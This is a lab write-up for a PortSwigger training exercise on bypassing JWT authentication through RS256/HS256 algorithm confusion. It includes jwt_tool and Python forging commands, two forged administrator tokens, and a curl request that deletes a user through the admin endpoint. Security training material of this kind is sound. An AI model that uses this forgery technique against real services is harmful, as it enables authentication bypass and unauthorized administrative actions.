# Lab 1 — Algorithm confusion with an exposed key

**PortSwigger:** JWT authentication bypass via algorithm confusion.

The server verifies RS256 tokens with an RSA key pair and publishes the public
key as a JWK at `/jwks.json`. We fetch that public key, convert it to PEM, and
HMAC-sign a forged `HS256` token whose `sub` is `administrator`, using the PEM
bytes as the secret. The server, reading `alg` from our header, verifies with
HMAC and the same bytes — so the forgery is accepted.

> **Lab host** `0a7700c10459405182db029c0050009e.web-security-academy.net` is an
> expired PortSwigger instance. It is dead and non-reusable; kept only for
> authenticity.

## Prerequisites

```bash
pip install cryptography   # for jwk_to_pem.py
# forge_hs256.py uses only the standard library
```

## Step sequence

| # | Step | Command / action | Evidence |
|---|------|------------------|----------|
| 1 | Log in as `wiener` and capture the session JWT (RS256). | Burp Proxy history. | [`evidence/original-rs256-token.txt`](evidence/original-rs256-token.txt) |
| 2 | Fetch the public key. | `curl --http1.1 https://<lab-host>/jwks.json` | [`evidence/jwks.json`](evidence/jwks.json) |
| 3 | Convert the JWK `(n,e)` to a PEM public key. | `python3 -I scripts/jwk_to_pem.py evidence/jwks.json -o evidence/key.pem` | [`evidence/key.pem`](evidence/key.pem) |
| 4 | Forge an `HS256` token with `sub=administrator`, HMAC-signed with the PEM bytes. | see **Forge** below | [`evidence/forged-hs256-admin-A-with-newline.txt`](evidence/forged-hs256-admin-A-with-newline.txt), [`...-B-without-newline.txt`](evidence/forged-hs256-admin-B-without-newline.txt) |
| 5 | Send the admin delete request with the forged token as the session cookie. | see **Solve** below | `TODO` (see below) |

## Forge `[Verified]`

Two interchangeable methods were used.

### Method A — jwt_tool (used during the session)

```bash
jwt_tool <RS256_token> -X k -pk key.pem -I -pc sub -pv administrator
```

`-X k` is key-confusion mode; `-pk key.pem` supplies the public key as the HMAC
secret; `-I -pc sub -pv administrator` injects the `administrator` subject.

### Method B — the bundled script (dependency-free, shows the mechanism)

```bash
python3 -I scripts/forge_hs256.py evidence/key.pem \
  --from-token "$(cat evidence/original-rs256-token.txt)" \
  --sub administrator
```

This prints **both** newline variants (see below). The forged tokens captured
during the session are:

```
# Variant A — PEM WITH trailing newline (standard form, try first)
eyJraWQiOiIzNDk4MmRkMy1lNGMxLTQzYjItYjA4YS0zMWRkYzM2NzIyMzMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTkwNjg0OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.dEIMdE7-CQmkEQYhRSg4-XQok2Ul9TGSAQKRbd5wKyI

# Variant B — PEM WITHOUT trailing newline (fallback)
eyJraWQiOiIzNDk4MmRkMy1lNGMxLTQzYjItYjA4YS0zMWRkYzM2NzIyMzMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc5MTkwNjg0OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.9GVimMzpq3HM8HJN4n9RzP_rj5oojZQv2hkC7dk9ct8
```

Both decode to the same header and payload and differ only in the signature:

```json
{"kid":"34982dd3-e4c1-43b2-b08a-31ddc3672233","alg":"HS256"}
{"iss":"portswigger","exp":1791906848,"sub":"administrator"}
```

`[Verified]` Both signatures were reproduced byte-for-byte from `key.pem`
while writing this repo: token A equals `HMAC-SHA256(key.pem WITH newline)` and
token B equals `HMAC-SHA256(key.pem WITHOUT newline)` over the same signing
input. This confirms the evidence is internally consistent and that the attack
reduces to "HMAC with the public key PEM bytes".

### The trailing-newline ambiguity `[Textbook]`

HMAC is computed over **raw bytes**. The server's HMAC secret is the exact byte
sequence of the public key as it stores it. A PEM file conventionally ends with
a newline:

```
-----END PUBLIC KEY-----\n
```

`key.pem` with that trailing `\n` and the same file with it stripped are two
**different secrets**, producing two different signatures. You cannot know
which byte sequence the server holds, so you try both — hence variants A and B.
Variant A (with newline) is the common case and is tried first.

## Solve `[Verified setup, solve TODO]`

Send the forged token as the `session` cookie to the admin delete endpoint.
Force HTTP/1.1 to avoid the SETTINGS-frame error (see
[five-walls.md](../04-debugging-notes/five-walls.md), wall 4):

```bash
curl -i --http1.1 "https://<lab-host>/admin/delete?username=carlos" \
  --cookie "session=<forged_token>"
```

A successful solve returns `302 Found` redirecting to `/admin`, deletes
`carlos`, and flips the lab to "Solved".

> TODO: paste your own captured 302 response here after re-running the delete request.

The successful response was **not** captured during the session, so nothing is
shown here. The captured *failure* responses (401, the HTTP/2 error, 504) are
real and are documented in [five-walls.md](../04-debugging-notes/five-walls.md)
and [`evidence/http-responses.txt`](evidence/http-responses.txt).

## Starting-state screenshot

![Early attempt, first instance: signature rejected, session cleared, bounced to /login.](evidence/screenshots/01-start-302-wiener-rejected.png)

> Caption: Early attempt, first instance (`kid: 37ff8d1f...`): signature
> rejected, session cleared, bounced to `/login`. This is a different instance
> from the tokens above (`kid: 34982dd3...`).

## Scripts

- [`scripts/jwk_to_pem.py`](scripts/jwk_to_pem.py) — JWK `(n,e)` → PEM.
- [`scripts/forge_hs256.py`](scripts/forge_hs256.py) — HMAC-sign a forged token
  with the PEM bytes; emits both newline variants.
